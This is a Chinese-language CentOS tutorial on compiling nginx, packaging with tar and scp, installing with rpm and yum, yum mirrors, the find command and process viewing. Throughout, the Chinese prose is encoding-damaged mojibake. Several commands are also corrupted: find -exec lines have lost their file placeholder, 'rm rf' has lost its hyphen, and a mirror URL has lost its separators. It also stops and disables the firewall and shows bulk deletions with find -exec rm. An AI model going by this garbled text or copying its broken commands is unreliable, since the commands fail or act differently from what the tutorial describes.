å¥½äº†--prefix=/usr/local/nginxï¼Œè¦å®‰è£…åˆ°/usr/local/nginxç›®å½•ä¸­å»ã€‚# 3.å®‰è£…make install # æŸ¥çœ‹å®‰è£…ç›®å½•ï¼Œè¿™å°±æ˜¯å®ƒè¿™ä¸ªè½¯ä»¶å®‰è£…çš„æ‰€æœ‰æ–‡ä»¶ [root@localhost nginx-1.20.1]# ls /usr/local/nginx/ conf html logs sbin # è¿™æ ·çœ‹ç›®å½•ç»“æ„çœ‹ç€ä¸å¤ªæ¸…æ™°ï¼Œæˆ‘ä»¬å¯ä»¥å®‰è£…ä¸€ä¸‹treeè¿™ä¸ªå·¥å…·ï¼Œæ¥è¿›è¡Œç›®å½•æŸ¥çœ‹ [root@localhost nginx-1.20.1]# yum install tree -y # å®‰è£…å®Œtreeä¹‹åï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ç›®å½•ï¼Œçœ‹ç€å°±æ¸…æ™°å¤šäº†ï¼Œæ ‘çŠ¶ç»“æ„æ˜¾ç¤ºã€‚ [root@localhost nginx-1.20.1]# tree /usr/local/nginx/ /usr/local/nginx/ â”œâ”€â”€ conf # è¯¥è½¯ä»¶çš„é…ç½®æ–‡ä»¶æ‰€åœ¨ç›®å½• â”‚ â”œâ”€â”€ fastcgi.conf â”‚ â”œâ”€â”€ fastcgi.conf.default â”‚ â”œâ”€â”€ fastcgi_params â”‚ â”œâ”€â”€ fastcgi_params.default â”‚ â”œâ”€â”€ koi-utf â”‚ â”œâ”€â”€ koi-win â”‚ â”œâ”€â”€ mime.types â”‚ â”œâ”€â”€ mime.types.default â”‚ â”œâ”€â”€ nginx.conf â”‚ â”œâ”€â”€ nginx.conf.default â”‚ â”œâ”€â”€ scgi_params â”‚ â”œâ”€â”€ scgi_params.default â”‚ â”œâ”€â”€ uwsgi_params â”‚ â”œâ”€â”€ uwsgi_params.default â”‚ â””â”€â”€ win-utf â”œâ”€â”€ html # ç½‘ç«™æºä»£ç å­˜æ”¾ç›®å½•ï¼Œè¿™ä¸ªnginxå…¶å®ä¸»è¦æ˜¯ç”¨æ¥éƒ¨ç½²ç½‘ç«™çš„ï¼Œç½‘ç«™çš„ä»£ç å¯ä»¥æ”¾åˆ°è¿™ä¸ª ç›®å½•ä¸­ â”‚ â”œâ”€â”€ 50x.html â”‚ â””â”€â”€ index.html â”œâ”€â”€ logs # è¿™ä¸ªè½¯ä»¶è‡ªå¸¦æ—¥å¿—è®°å½•åŠŸèƒ½ï¼Œè®°å½•çš„æ—¥å¿—å­˜æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸­ â””â”€â”€ sbin â””â”€â”€ nginx # è¿™ä¸ªæ˜¯è½¯ä»¶çš„å…³é”®æ€§çš„å¯åŠ¨ç¨‹åºï¼Œç±»ä¼¼äºæˆ‘ä»¬windowså®‰è£…çš„qqç›®å½•ä¸­çš„QQ.exe 4 directories, 18 files3.è¿è¡Œ ## æŒ‡ä»¤ï¼š/usr/local/nginx/sbin/nginxï¼Œæ²¡æœ‰é…ç½®ç¯å¢ƒå˜é‡ï¼Œæ‰€ä»¥è¦ç”¨å®Œæ•´è·¯å¾„æ¥è¿è¡Œ [root@localhost nginx-1.20.1]# /usr/local/nginx/sbin/nginx [root@localhost nginx-1.20.1]# #çœ‹ä¸Šå»æ²¡ä»€ä¹ˆæ•ˆæœï¼Œä½†æ˜¯å·²ç»è¿è¡Œäº† # å¯ä»¥é€šè¿‡æµè§ˆå™¨è®¿é—®è¿™ä¸ªnginxäº†ï¼Œè®¿é—®ä¹‹å‰è¦å…³é—­ä¸€ä¸‹é˜²ç«å¢™ã€‚ # å…³é—­é˜²ç«å¢™ systemctl stop firewalld # å–æ¶ˆé˜²ç«å¢™çš„å¼€æœºè‡ªå¯ systemctl disable firewalld # ä½¿ç”¨æµè§ˆå™¨è®¿é—®http://è™šæ‹Ÿæœºçš„ipåœ°å€ ## http://192.168.61.132/ å°±å¯ä»¥çœ‹åˆ°ç½‘ç«™äº†ã€‚ ## å…³äºnginxè¿™ä¸ªè½¯ä»¶å¦‚ä½•ä½¿ç”¨ï¼Œæˆ‘ä»¬åé¢è¯¾ç¨‹ä¸­ä¼šè¯¦ç»†çš„è®²è§£ï¼Œè¿™é‡Œå…ˆç®€å•æ„Ÿå—ä¸€ä¸‹ç¼–è¯‘å®‰è£…è¿‡ç¨‹å³å¯ã€‚ # æ‰“åŒ…ï¼šå°±æ˜¯å°†æˆ‘ä»¬ç¼–è¯‘å¥½çš„ç¨‹åºæ‰“åŒ…èµ·æ¥ï¼Œç»™å…¶ä»–äººç”¨çš„æ—¶å€™ï¼Œå…¶ä»–äººå°±ä¸ç”¨ç¼–è¯‘äº†ï¼Œå› ä¸ºä½ å·²ç»ç¼–è¯‘å¥½äº†ï¼Œæˆ‘ä»¬æ™®é€šç”¨æˆ·ä½¿ç”¨çš„è½¯ä»¶å°± æ˜¯åˆ«äººç¼–è¯‘æ‰“åŒ…ä¹‹åçš„è½¯ä»¶ã€‚ ## /usr/local/nginx è¿™ä¸ªç›®å½•å°±æ˜¯æˆ‘ä»¬ç¼–è¯‘å¥½ä¹‹åçš„æ•´ä¸ªè½¯ä»¶çš„æ‰€æœ‰è¿è¡Œæ–‡ä»¶ç›®å½•ï¼Œæˆ‘ä»¬æ‰“åŒ…å®ƒå³å¯ # æ‰“åŒ…å‹ç¼© [root@localhost nginx-1.20.1]# cd /usr/local/ [root@localhost local]# ls bin etc games include lib lib64 libexec nginx sbin share src [root@localhost local]# tar -zcf /tmp/nginx_jaden.tar.gz nginx [root@localhost local]# ls bin etc games include lib lib64 libexec nginx sbin share src [root@localhost local]# ls /tmp/ ks-script-ed2ODG nginx_jaden.tar.gz # æ¨é€ç»™å¦å¤–ä¸€å°ä¸»æœº [root@localhost tmp]# scp nginx_jaden.tar.gz root@192.168.61.135:/tmp # å¦å¤–ä¸€å°ä¸»æœºçš„æ“ä½œï¼šè§£å‹åˆ°/usr/localç›®å½•ä¸‹ï¼Œç„¶åè¿è¡Œ root@localhost tmp]# ls nginx_jaden.tar.gz [root@localhost tmp]# mv nginx_jaden.tar.gz /usr/local/ [root@localhost tmp]# cd /usr/local/ [root@localhost local]# ls bin etc games include lib lib64 libexec nginx_jaden.tar.gz sbin share src [root@localhost local]# tar -zxf nginx_jaden.tar.gz [root@localhost local]# ls bin etc games include lib lib64 libexec nginx nginx_jaden.tar.gz sbin share src [root@localhost local]# /usr/local/nginx/sbin/nginx [root@localhost local]# systemctl stop firewalld 2.15.2 rpmå®‰è£…# åˆšæ‰æˆ‘ä»¬æåˆ°è¿‡ï¼Œç¼–è¯‘è¿˜æ˜¯æ¯”è¾ƒç¹ççš„ï¼Œä¸ºäº†æ–¹ä¾¿ä½¿ç”¨è€…ï¼Œä¸€èˆ¬éƒ½ä¼šç¼–è¯‘ä¹‹åå‘ç»™ä½¿ç”¨è€…ï¼Œç”¨èµ·æ¥ä¸éœ€è¦ç¼–è¯‘ï¼Œå°±æ–¹ä¾¿å¤šäº†ã€‚åªè¦æœ‰äººç¼–è¯‘ä¸€æ¬¡ï¼Œå°†ç¼–è¯‘åçš„ç¨‹åºè´¡çŒ®å‡ºæ¥ï¼Œå¤§å®¶å°±å¯ä»¥ç”¨äº†ã€‚æ‰€ä»¥è¿™äº›åšç³»ç»Ÿçš„å‚å•†ä¹Ÿå‘ç°è¿™æ ·æŒºå¥½ï¼Œæ‰€ä»¥è¿™äº›å‚å•†å¹²è„†å°†è‡ªå·±çš„è½¯ä»¶ä¹Ÿæ‰“åŒ…ä¸€ä¸‹ï¼Œredhatã€debianç­‰éƒ½åšäº†è‡ªå·±è½¯ä»¶çš„æ‰“åŒ…å·¥ä½œï¼Œå°†è‡ªå·±çš„è½¯ä»¶æ‰“åŒ…å¥½ä¹‹åï¼Œä¾›ç”¨æˆ·ä¸‹è½½ä½¿ç”¨ã€‚ä¸‹è½½è½¯ä»¶éœ€è¦ç”¨åˆ°å¯¹åº”ç³»ç»Ÿçš„åŒ…ç®¡ç†å·¥å…·ã€‚# redhatç³»æ‰“å‡ºæ¥çš„åŒ…å«åšï¼šrpmåŒ…ã€‚ç”¨yumå®‰è£…çš„ç¨‹åºåŒ…å…¶å®éƒ½æ˜¯rmpåŒ…ï¼Œæ¯”å¦‚åˆšæ‰å®‰è£…çš„treeã€‚rpmçš„åŒ…æˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸ä½¿ç”¨yumè€Œæ‰‹åŠ¨å®‰è£…ã€‚# debianç³»æ‰“å‡ºæ¥çš„åŒ…å«åšï¼šdebåŒ…ã€‚#rpmå…¨ç§°ï¼šredhat package manageråŒ…ç®¡ç†å™¨# æ‰‹åŠ¨å®‰è£…rpmåŒ…ç¤ºä¾‹ï¼šä¸éœ€è¦ç¼–è¯‘å®‰è£…ã€ä¹Ÿä¸ç”¨yumå®‰è£…ã€‚# å®‰è£…wget yum install wget -y# ä½¿ç”¨wgetä¸‹è½½rpmåŒ… wget https://mirrors.tuna.tsinghua.edu.cn/centos/7/os/x86_64/Packages/tree-1.6.0-10.el7.x86_64.rpm # å¦‚æœæ²¡æœ‰wgetï¼Œå¯ä»¥å…ˆç”¨curlä¸‹è½½ï¼š curl -o wget.rpm https://mirrors.tuna.tsinghua.edu.cn/centos/7/os/x86_64/Packages/wget-1.14-18.el7_6.1.x86_64.rpm # å®‰è£…rpmåŒ… #rpm -iæ˜¯å®‰è£…ï¼Œvhæ˜¯æ˜¾ç¤ºå®‰è£…è¿›åº¦æ¡çš„æ„æ€ã€‚ rpm -ivh tree-1.6.0-10.el7.x86_64.rpm # å¸è½½ rpm -e tree# å‡çº§ rpm -Uvh xxx.rpm# æŸ¥çœ‹å·²å®‰è£…çš„è½¯ä»¶ rpm -qa|grep httpd#ä»¥æ ‘çŠ¶çš„æ˜¾ç¤ºæŒ‡å®šç›®å½•ä¸‹çš„ç›®å½•å’Œæ–‡ä»¶çš„åç§° tree ä¾‹å­1ï¼š tree /usr/local## rpmå®‰è£…è½¯ä»¶ä¸ªå°é—®é¢˜ï¼š## æ¯”å¦‚ï¼šå®‰è£…vimï¼Œä¼šæç¤ºå®‰è£…å¤±è´¥ï¼Œéœ€è¦å„ç§ä¾èµ–åŒ…ï¼Œéœ€è¦å…ˆå»å®‰è£…ä¾èµ–åŒ…ã€‚wget http://mirrors.tuna.tsinghua.edu.cn/centos/7/os/x86_64/Packages/vim-enhanced-7.4.629-7.el7.x86_64.rpmrpm -ivh vim-enhanced-7.4.629-7.el7.x86_64.rpm## æ‰€ä»¥ï¼Œç”¨rpmå®‰è£…è½¯ä»¶ä¸å¥½è§£å†³ä¾èµ–åŒ…çš„é—®é¢˜ï¼Œæ‰€ä»¥å‡ºæ¥äº†ä¸‹é¢çš„yumå®‰è£…æ–¹å¼ï¼Œè‡ªåŠ¨ä¸‹è½½å®‰è£…éœ€è¦çš„ä¾èµ–åŒ…ã€‚ä»¥åéƒ½ç”¨yumæ¥å®‰è£…ã€‚ 2.15.3 yumå®‰è£…#è‡ªåŠ¨è§£å†³rpmä¾èµ–#yumå®‰è£…æ‰©å±•yumä»“åº“ yum install epel-release -y#yumå®‰è£…nginx yum install nginx -y#yumç§»é™¤nginx yum remove nginx -y#æŸ¥çœ‹ä»“åº“rpmçš„æ•°é‡ yum repolist ## ç¼–è¯‘å®‰è£…ï¼šä¼˜ç‚¹ï¼š è‡ªç”±å®šåˆ¶ ç—›ç‚¹ï¼šéš¾åº¦é«˜ï¼Œæ­¥éª¤ç¹ç## rpmå®‰è£…ï¼šä¼˜ç‚¹ï¼šå®‰è£…ç®€å• ç—›ç‚¹ï¼šéœ€è¦è‡ªå·±è§£å†³ä¾èµ–ï¼Œä¸æ”¯æŒå®šåˆ¶## yumå®‰è£…ï¼šä¼˜ç‚¹ï¼šè‡ªåŠ¨è§£å†³ä¾èµ–ï¼Œé»˜è®¤å®‰è£…æœ€æ–°ç‰ˆ ç—›ç‚¹ï¼šä¸æ”¯æŒå®šåˆ¶ 2.15.4 yumä»“åº“(é•œåƒç«™)## å¦‚ä¸‹ï¼Œå®‰è£…å·¥å…·æ—¶ä¼šæç¤ºï¼šè‡ªåŠ¨ä¼šä»ä¸‹é¢çš„ä»“åº“ä¸­æ¥ä¸‹è½½è½¯ä»¶åŒ…ï¼Œcentosçš„å®˜æ–¹åº“åœ¨å›½å¤–http://mirror.centos.org/ï¼Œ ## è¿™ä¸ªä»“åº“åœ°å€æ˜¯åœ¨centosä¸­é…ç½®çš„ï¼Œåœ¨å¦‚ä¸‹é…ç½®æ–‡ä»¶ä¸­[root@localhost ~]# cd /etc/yum.repos.d/[root@localhost yum.repos.d]# lsCentOS-Base.repo CentOS-Debuginfo.repo CentOS-Media.repo CentOS-Vault.repoCentOS-CR.repo CentOS-fasttrack.repo CentOS-Sources.repo CentOS-x86_64-kernel.repo# æœ‰å‡ ä¸ªrepoæ–‡ä»¶ï¼Œè¡¨ç¤ºé…ç½®äº†å‡ ä¸ªä»“åº“ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†æ˜¯ç¦ç”¨çŠ¶æ€çš„ï¼Œé»˜è®¤å°±ä¸€ä¸ªå¯ç”¨çš„CentOS\u0002Base.repoã€‚æ¯”å¦‚æˆ‘ä»¬çœ‹ä¸€ä¸ªæ–‡ä»¶CentOS-Vault.repo CentOS-Vault.repoå¦‚ä¸‹ï¼Œçœ‹ä¸åˆ°enabled0çš„è¡¨ç¤ºå¯ç”¨çŠ¶æ€ CentOS-Base.repoå¦‚ä¸‹ï¼š ## ä½†æ˜¯å›½å¤–çš„åœ°å€ä¸‹è½½è½¯ä»¶å¤ªæ…¢äº†ï¼Œæ‰€ä»¥centoså®˜æ–¹è¯´æˆ‘å…è®¸ä½ ä»¬å’Œæˆ‘åŒæ­¥ï¼Œæ¯”å¦‚åä¸ºï¼Œä½ å’Œæˆ‘åŒæ­¥ä¸€ä¸‹ï¼Œåšä¸€ä¸ªä½ å›½å†…çš„é•œåƒåº“ï¼Œè¿™å°±æ˜¯åä¸ºçš„yumä»“åº“äº†æˆ–è€…è¯´é•œåƒç«™äº†ï¼Œå¾ˆå¤šä¼ä¸šå’Œå­¦æ ¡éƒ½æœ‰è‡ªå·±çš„é•œåƒç«™ã€‚é‚£ä¹ˆæˆ‘ä»¬yumå®‰è£…çš„æ—¶å€™æœ‰çœ‹åˆ°ï¼Œæ˜æ˜ä½¿ç”¨çš„æ˜¯å›½å†…çš„é•œåƒç«™å‘€ï¼Œè¿™æ˜¯æ€ä¹ˆåšåˆ°çš„ï¼Œå…¶å®é…ç½®æ–‡ä»¶ä¸­åšäº†ä¸€ä¸ªé•œåƒåœ°å€åˆ—è¡¨ï¼Œå¦‚ä¸‹ ## æˆ‘ä»¬æ‹¿å‡ºæ¥è¿™ä¸ªåœ°å€æ”¹ä¸€æ”¹http://mirrorlist.centos.org/?release=$releaseverarch=$basearchrepo=osinfra# $releaseverè¡¨ç¤ºç‰ˆæœ¬# $basearchè¡¨ç¤º32è¿˜æ˜¯64ä½# repo=osè¡¨ç¤ºæˆ‘ä»¬è¦ä¸‹è½½çš„æ˜¯æ“ä½œç³»ç»Ÿç›¸å…³çš„ä¸œè¥¿# infraè¿™ä¸ªå‚æ•°æ²¡ä»€ä¹ˆç”¨ï¼Œå¯åˆ æ‰# é‚£ä¹ˆæˆ‘ä»¬æ”¹ä¸€æ”¹ç½‘å€ï¼Œå¦‚ä¸‹http://mirrorlist.centos.org/?release=7arch=x86_64repo=os# è®¿é—®ä¸€ä¸‹è¿™ä¸ªåœ°å€ã€‚## æ•ˆæœå¦‚ä¸‹ ## è¿™å°±æ˜¯ä¸ºä»€ä¹ˆï¼Œæˆ‘ä»¬ç”¨yumå®‰è£…è½¯ä»¶çš„æ—¶å€™ï¼Œä»“åº“åœ°å€éƒ½æ˜¯å›½å†…çš„é•œåƒç«™åœ°å€çš„åŸå› äº†ï¼Œå®ƒä¼šè‡ªåŠ¨é€‰æ‹©ç¦»æˆ‘ä»¬æœ€è¿‘ã€ç½‘é€Ÿæœ€ä½³çš„å‡ ä¸ªåœ°å€æ¥ä¸‹è½½ã€‚ 2.16 findæ–‡ä»¶æŸ¥æ‰¾## æ–‡ä»¶æŸ¥æ‰¾ï¼Œæˆ‘ä»¬åœ¨windowsç”¨çš„æ¯”è¾ƒå¤šï¼Œç³»ç»Ÿè‡ªå¸¦çš„æœç´¢æ–¹å¼ã€ç¬¬ä¸‰æ–¹æœç´¢å·¥å…·everythingç­‰ã€‚# linuxä¸Šæ²¡æœ‰å›¾å½¢åŒ–ç•Œé¢ï¼Œå°±è¦å€ŸåŠ©findæŒ‡ä»¤æ¥æŸ¥äº†ã€‚ 2.16.1 æ™®é€šæŸ¥è¯¢# æ™®é€šæŸ¥è¯¢ find /etc -maxdepth 1 -type f -name pa* å‘½ä»¤ ç›®å½•... æŸ¥æ‰¾æ·±åº¦ ç±»å‹ æ–‡ä»¶åç§°åŒ…å« # -typeæ–‡ä»¶ç±»å‹ï¼šfè¡¨ç¤ºæ–‡ä»¶ï¼Œä¸æŒ‡å®šç±»å‹çš„è¯ï¼Œæ–‡ä»¶å’Œç›®å½•éƒ½ä¼šæŸ¥æ‰¾ # -maxdepthæŸ¥æ‰¾æ·±åº¦ï¼šç›®å½•å±‚çº§çš„æ„æ€ï¼Œä¸æŒ‡å®šçš„è¯ï¼Œå°±æŒ‰ç…§æœ€å¤§æ·±åº¦æ¥æŸ¥æ‰¾ # pa*ï¼š *è¡¨ç¤ºåŒ¹é…ä»»æ„paå¼€å¤´çš„å†…å®¹ï¼Œ*å·è¿˜å¯ä»¥å†™åœ¨å¼€å¤´ 2.16.2 æŒ‰ç…§å¤§å°æŸ¥æ‰¾## æŒ‰ç…§æ–‡ä»¶å¤§å°æŸ¥æ‰¾(å•ä½kMG,kè¦å°å†™ï¼ŒMGè¦å¤§å†™ï¼Œä¸å¸¦å•ä½å°±æŒ‰ç…§bå•ä½æ¥æŸ¥æ‰¾) 1.æŸ¥æ‰¾å¤§äº100Mçš„æ–‡ä»¶ find / -type f -size +100M [root@localhost tmp]# find / -type f -size +100M /proc/kcore find: â€˜/proc/1945/task/1945/fdinfo/6â€™: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½• # procæ˜¯è¿›ç¨‹ç›®å½•ï¼Œæœ‰äº›è¿›ç¨‹è¿è¡Œèµ·æ¥ä¹‹åèƒ½çœ‹åˆ°æ–‡ä»¶ä¿¡æ¯ï¼Œç¨‹åºè¿è¡Œç»“æŸä¹‹åï¼Œè¿›ç¨‹æ–‡ä»¶ä¹Ÿæ¶ˆå¤±äº†ï¼Œæ‰€ä»¥çœ‹åˆ°procçš„æŠ¥é”™å¾ˆæ­£å¸¸ï¼Œå¹¶ä¸”procçš„æƒé™å¾ˆé«˜ï¼Œä¸æ˜¯ä¸€èˆ¬äººå¯ä»¥è®¿é—®çš„ï¼Œæ‰€ä»¥ä¹Ÿç»å¸¸ä¼šæŠ¥æƒé™ä¸å¤Ÿç­‰é”™è¯¯ä¿¡æ¯ï¼Œæ‰€ä»¥ä»¥åçœ‹åˆ°procçš„æŠ¥é”™ç›´æ¥å¿½ç•¥å³å¯ã€‚ find: â€˜/proc/1945/fdinfo/5â€™: ## æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•/sys/devices/pci000000/0000:00:0f.0/resource1_wc/sys:/devices/pci0000:00/0000:00:0f.0/resource1/var/cache/yum/x86_64/7/updates/gen/primary_db.sqlite/usr/lib/locale/locale-archive [root@localhost tmp]# ls -h /usr/lib/locale/locale-archive #å¤§å°ç¡®å®è¶…è¿‡äº†100M -rw-r--r--. 1 root root 102M 3æœˆ 15 20:10 /usr/lib/locale/locale-archive 2.æŸ¥æ‰¾å°äº2kçš„æ–‡ä»¶ find /root/nginx-1.20.2 -type f -size -2k 3.æŸ¥æ‰¾å¤§äº50MåŒæ—¶å°äº100Mçš„æ–‡ä»¶ find / -type f -size +50M -and -size -100M 2.16.3 å¿½ç•¥å¤§å°å†™## å¿½ç•¥å¤§å°å†™æŸ¥è¯¢ find /etc -maxdepth 1 -iname pa* # iæ˜¯ignoreçš„ç®€å†™ï¼Œå¿½ç•¥çš„æ„æ€ 2.16.4 æ ¹æ®ä¿®æ”¹æ—¶é—´æŸ¥æ‰¾æ–‡ä»¶## æ ¹æ®ä¿®æ”¹æ—¶é—´æŸ¥æ‰¾æ–‡ä»¶ [root@localhost ~]# stat 1.txt æ–‡ä»¶ï¼š1.txt å¤§å°ï¼š0 å—ï¼š0 IO å—ï¼š4096 æ™®é€šç©ºæ–‡ä»¶ è®¾å¤‡ï¼š801h/2049d Inodeï¼š67108933 ç¡¬é“¾æ¥ï¼š1 æƒé™ï¼š(0644/-rw-r--r--) Uidï¼š( 0/ root) Gidï¼š( 0/ root) ç¯å¢ƒï¼šunconfined_u:object_r:admin_home_t:s0 æœ€è¿‘è®¿é—®ï¼š2023-03-23 09:04:35.339235371 +0800 #Access time æœ€è¿‘æ›´æ”¹ï¼š2023-03-23 09:04:35.339235371 +0800 #Modify time æœ€è¿‘æ”¹åŠ¨ï¼š2023-03-23 09:04:35.339235371 +0800 #Change time åˆ›å»ºæ—¶é—´ï¼š- ## æ—¶é—´å‚æ•°ï¼šatime mtime ctime amin mmin cmin #(timeæ˜¯æŒ‰ç…§å¤©æ¥æŸ¥æ‰¾ï¼Œminæ˜¯æŒ‰åˆ†é’ŸæŸ¥æ‰¾)# æ—¶é—´å•ä½ä¸ºå¤©find /opt -type f -mtime -1 #-1ä»£è¡¨ä¸€å¤©ä»¥å†…ï¼Œ+1ä¸€å¤©ä»¥å‰# æ—¶é—´å•ä½ä¸ºåˆ†é’Ÿ [root@localhost ~]# find /root -type f -mmin -20 /root/.bash_history /root/ReadMe.txt /root/.lesshst# æŸ¥æ‰¾1å¤©ä¹‹å‰ï¼Œ10å¤©ä¹‹å†…ï¼Œä¿®æ”¹è¿‡çš„æ–‡ä»¶ [root@localhost ~]# find /etc/ -type f -mtime +1 -and -mtime -10 2.16.5 å–åï¼šï¼## å–å: ! [root@localhost ~]# find /root -type f -name *.txt # æ‰¾åç§°ä»¥.txtç»“å°¾çš„æ–‡ä»¶ /root/1.txt /root/å­¦ä¹ å‰å‡†å¤‡.txt [root@localhost ~]# find /root -type f ! -name *.txt # æ‰¾åç§°ä¸­ä¸æ˜¯.txtç»“å°¾çš„æ–‡ä»¶ /root/.bash_logout /root/.bash_profile [root@localhost ~]# mkdir jaden [root@localhost ~]# mkdir wulaoban [root@localhost ~]# find /root -type f # æ‰¾æ–‡ä»¶ /root/.bash_logout /root/.bash_profile [root@localhost ~]# find /root ! -type f # æ‰¾æ–‡ä»¶å¤¹ /root/jaden /root/wulaoban 2.16.6 æ ¹æ®ç”¨æˆ·æ¥æŸ¥æ‰¾æ–‡ä»¶## æ ¹æ®ç”¨æˆ·æ¥æŸ¥æ‰¾æ–‡ä»¶ [root@localhost ~]# useradd jaden [root@localhost ~]# find / -user jaden # æŸ¥æ‰¾å±äºjadenç”¨æˆ·çš„æ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶ /var/spool/mail/jaden /home/jaden /home/jaden/.bash_logout /home/jaden/.bash_profile /home/jaden/.bashrc ## æ ¹æ®ç”¨æˆ·ç»„æ¥æŸ¥ [root@localhost ~]# find / -group jaden 2.17.7 ## å¯¹æ‰¾å‡ºçš„æ–‡ä»¶è¿›è¡Œå¤„ç†# æ ¼å¼ï¼šæ­£å¸¸çš„findè¯­å¥+æ“ä½œexec# æ¯”å¦‚æˆ‘ä»¬æŸ¥æ‰¾åˆ°äº†ä¸€äº›ç—…æ¯’æ–‡ä»¶ï¼Œæƒ³ç›´æ¥åˆ é™¤ find /tmp -type f -size +10K -exec rm rf \\; # è¡¨ç¤ºæˆ‘ä»¬æ‰¾åˆ°çš„é‚£äº›æ–‡ä»¶ï¼Œ\\;æ˜¯è¿™æ ·çš„ï¼šæ­£å¸¸execè¯­å¥æœ€åè¦åˆ†å·ç»“å°¾ï¼Œä½†æ˜¯åˆ†å·åœ¨linuxä¸­æœ‰ç‰¹æ®Šçš„æ„ä¹‰ ## æ¯”å¦‚ä¸€æ¬¡æ€§æ‰§è¡Œä¸¤ä¸ªæŒ‡ä»¤å¯ä»¥ ls -lh;idï¼Œè¿™æ ·æ‰§è¡Œï¼Œæ‰€ä»¥è¦å¯¹;è¿›è¡Œè½¬ä¹‰ï¼Œæ„æ€æ˜¯ä¸è¦å°†;ä½œä¸ºshellæŒ‡ä»¤çš„åˆ†éš” ## \\å°±æ˜¯è½¬ä¹‰ç¬¦å·ã€‚ä¾‹å­ï¼š [root@localhost tmp]# find /tmp -name vm* -exec rm -rf \\; find: â€˜/tmp/vmware-root_560-2957190359â€™: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½• find: â€˜/tmp/vmware-root_555-4282367637â€™: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½• find: â€˜/tmp/vmware-root_631-4021718894â€™: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½• [root@localhost tmp]# ls ks-script-ed2ODG nginx_jaden.tar.gz systemd-private-d38b668730bf4589896221daead5dbea-chronyd.service-be3NkFyum.log# ä¸‹é¢çš„ä¾‹å­å°±ä¸æ¼”ç¤ºäº†ã€‚find /root -type f -mmin -30 ! -name .* -exec rm \\;find /root -maxdepth 1 -type d -name Apa* -mmin -30 -exec cp -a /tmp \\; # å¤åˆ¶åˆ°tmpç›®å½•ä¸­ 2.17 è¿›ç¨‹ç®¡ç†## æ“ä½œç³»ç»Ÿéƒ½æœ‰è¿›ç¨‹çš„æ¦‚å¿µï¼Œwindowsåœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸­æŸ¥çœ‹ï¼Œlinuxç”¨psæŒ‡ä»¤æ¥æŸ¥çœ‹ã€‚ 2.17.1 æŸ¥çœ‹å’Œå…³é—­è¿›ç¨‹#æŸ¥çœ‹è¿›ç¨‹ ps å‚æ•°1ï¼šps -ef # pidï¼šå…¨ç§°process idï¼Œæ˜¯è¿›ç¨‹ç¼–å·ï¼Œæ¯æ¬¡å¯åŠ¨æŸä¸ªç¨‹åºï¼Œå®ƒçš„ç¼–å·å¯èƒ½éƒ½ä¸ä¸€æ ·ï¼Œè¿™ä¸ªæ˜¯ç¨‹åºå¯åŠ¨ä¹‹åç³»ç»Ÿéšæœºåˆ†é…çš„ã€‚# uidï¼šå…¨ç§°user idï¼Œæ˜¯è¿›ç¨‹æ‰€å±ç”¨æˆ·ï¼Œä¹Ÿå°±æ˜¯å“ªä¸ªç”¨æˆ·å¯åŠ¨çš„ï¼Œæˆ‘ä»¬å¯ä»¥åˆ‡æ¢ä¸ªç”¨æˆ·æ‰§è¡Œä¸€ä¸‹sleep 60ï¼Œå°±å¯ä»¥çœ‹åˆ°æ•ˆæœ# CMDä¸­çœ‹åˆ°[]æ‹¬èµ·æ¥çš„ï¼Œè¡¨ç¤ºè¿™äº›éƒ½æ˜¯ç³»ç»Ÿçº§åˆ«çš„è¿›ç¨‹ï¼Œæ¯”å¦‚ä¸€äº›ç¡¬ä»¶é©±åŠ¨ç¨‹åºä¹‹ç±»çš„ï¼Œè¿™äº›éƒ½ä¸è¦åŠ¨ã€‚ä¸å¸¦[]çš„éƒ½æ˜¯ç”¨æˆ·çº§åˆ«çš„ã€‚# ppidï¼šå…¨ç§°parent process idï¼Œçˆ¶è¿›ç¨‹ï¼Œè®°å½•çš„æ˜¯æŸä¸ªè¿›ç¨‹æ˜¯ç”±å“ªä¸ªè¿›ç¨‹åˆ›å»ºå‡ºæ¥çš„ã€‚å¯ä»¥é€šè¿‡pstreeå·¥å…·æ¥æŸ¥çœ‹ä»å±å…³ç³»ã€‚# Cï¼šè¿™ä¸ªä¸ç”¨ç®¡ã€‚# STIMEï¼šå…¨ç§°start timeï¼Œè¿›ç¨‹çš„å¯åŠ¨æ—¶é—´ã€‚# TTYï¼š ç”¨æ¥æ˜¾ç¤ºå“ªäº›æ˜¯æœ¬åœ°å¯åŠ¨çš„ï¼Œå“ªäº›æ˜¯è¿œç¨‹ç»ˆç«¯è¿æ¥ä¸Šæ¥å¯åŠ¨çš„ã€‚é€šè¿‡wæŒ‡ä»¤å¯ä»¥çœ‹åˆ°å“ªäº›ç»ˆç«¯ç™»å½•ç€ä¸»æœºã€‚åªè¦ç™»å½•æˆåŠŸä¸€ä¸ªç»ˆç«¯ï¼Œé‚£å°±å¤šä¸€ä¸ªç»ˆç«¯ã€‚# TIMEï¼šè¿™ä¸ªæ²¡å•¥ç”¨# CMDï¼šè¿™ä¸ªè¿›ç¨‹æ‰§è¡Œäº†ä»€ä¹ˆæŒ‡ä»¤## å®‰è£…ä¸€ä¸ªpstree# æ³¨æ„ï¼šæˆ‘ä»¬å®‰è£…çš„è½¯ä»¶çš„åå­—å’Œä½¿ç”¨çš„æ—¶å€™çš„æŒ‡ä»¤åç§°ä¸ä¸€å®šæ˜¯ä¸€æ ·çš„ï¼Œæ¯”å¦‚lrzszï¼Œä½¿ç”¨çš„æ—¶å€™æ˜¯rz\\szä¸Šä¼ ä¸‹è½½ã€‚# æƒ³æŸ¥çœ‹æˆ‘ä»¬æƒ³è¦ä½¿ç”¨çš„æŸä¸ªæŒ‡ä»¤ï¼Œæ˜¯å“ªä¸ªè½¯ä»¶åŒ…æä¾›çš„ï¼Œå¯ä»¥è¾“å…¥yum provides æŒ‡ä»¤åç§°ï¼Œæ¯”å¦‚yum provides pstree [root@localhost ~]# yum provides pstree [root@localhost ~]# yum install psmisc -y [root@localhost ~]# pstree# 